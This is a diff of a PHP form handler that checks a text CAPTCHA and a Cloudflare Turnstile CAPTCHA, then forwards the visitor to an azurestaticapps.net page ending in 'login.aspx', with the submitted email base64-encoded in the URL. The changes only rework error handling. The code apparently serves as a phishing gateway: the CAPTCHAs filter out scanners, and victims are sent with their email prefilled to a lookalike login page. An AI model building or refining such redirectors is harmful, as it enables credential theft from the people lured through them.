@@ -14,7 +14,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     // Validate text-based CAPTCHA
     if ($userTextCaptcha !== $_SESSION['captcha_text']) {
-        echo "Text CAPTCHA validation failed. Please try again.";
+        // Redirect back to the form with an error message
+        $_SESSION['error_message'] = "Text CAPTCHA verification failed. Please try again.";
+        header("Location: index.php");
         exit;
     }
 
@@ -39,20 +41,24 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $verify = file_get_contents('https://challenges.cloudflare.com/turnstile/v0/siteverify', false, $context);
     $captchaSuccess = json_decode($verify);
 
-    if ($captchaSuccess->success) {
-        // Both CAPTCHAs passed, proceed with further processing
-
-        // Encode the email address in Base64
-        $encodedEmail = base64_encode($email);
-
-        // Construct the redirect URL with the encoded email
-        $redirectUrl = "https://orange-ground-01fdf2b1e.5.azurestaticapps.net/auth/v/?id=abc123XYZ4567890/message?data=($encodedEmail)/login.aspx";
-
-        // Redirect the user
-        header("Location: $redirectUrl");
-        exit();
-    } else {
-        echo "Turnstile CAPTCHA validation failed. Please try again.";
+    if (!$captchaSuccess->success) {
+        // Redirect back to the form with an error message
+        $_SESSION['error_message'] = "Cloudflare CAPTCHA verification failed. Please try again.";
+        header("Location: index.php");
+        exit;
     }
+
+    // Proceed if both CAPTCHAs are verified
+    $_SESSION['error_message'] = null; // Clear any previous error messages
+
+    // Encode the email address in Base64
+    $encodedEmail = base64_encode($email);
+
+    // Construct the redirect URL with the encoded email
+    $redirectUrl = "https://orange-ground-01fdf2b1e.5.azurestaticapps.net/auth/v/?id=abc123XYZ4567890/message?data=($encodedEmail)/login.aspx";
+
+    // Redirect the user
+    header("Location: $redirectUrl");
+    exit;
 }
 ?>
